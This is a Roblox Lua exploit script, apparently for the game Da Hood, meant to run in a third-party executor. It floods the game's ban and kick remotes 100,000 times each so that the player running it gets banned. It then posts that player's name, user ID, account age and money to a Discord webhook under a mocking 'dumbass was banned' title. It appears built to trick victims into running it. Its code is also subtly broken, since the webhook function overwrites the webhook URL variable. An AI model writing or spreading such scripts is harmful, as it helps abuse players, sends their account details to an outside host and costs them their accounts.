local remargs ={'CHECKER_1','TeleportDetect','OneMoreTime','CHECKER','GUI_CHECK','OneMoreTime','checkingSPEED','BANREMOTE','PERMAIDBAN','KICKREMOTE','BR_KICKPC','BR_KICKMOBILE'};
local http = request or syn.request or http.request
local ht = game:GetService('HttpService')
local webhook = 'Your WebHook'
local lp = game:GetService('Players').LocalPlayer
local money = lp.PlayerGui.MainScreenGui:WaitForChild('MoneyText')

function webhook()
local data = {
    ['content'] = '',
    ['embeds'] = {
    {
        ['title'] = 'dumbass was banned (made by indexing)',
        ['description'] = 'Info:\n' .. 'Name: ' .. lp.Name .. '\n' .. 'User Id: ' ..lp.UserId .. '\n' .. 'Account Age: ' ..lp.AccountAge .. '\n' .. 'dhc banned with: ' .. money.text,
        ["thumbnail"] = {
            url = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. lp.UserId .. '&size=352x352&format=Png&isCircular=false=' 
        }
    }
  }
}
local head = {
    ['content-type'] = 'application/json'
}
local d = ht:JSONEncode(data)
http({Url = webhook, Body = d, Method = 'POST',Headers=head})
end


for i,v in pairs(remargs) do 
   if game.ReplicatedStorage.MainEvent then 
        for i = 1,100000 do 
           game.ReplicatedStorage.MainEvent:FireServer(v)
        end
    end
end

webhook()
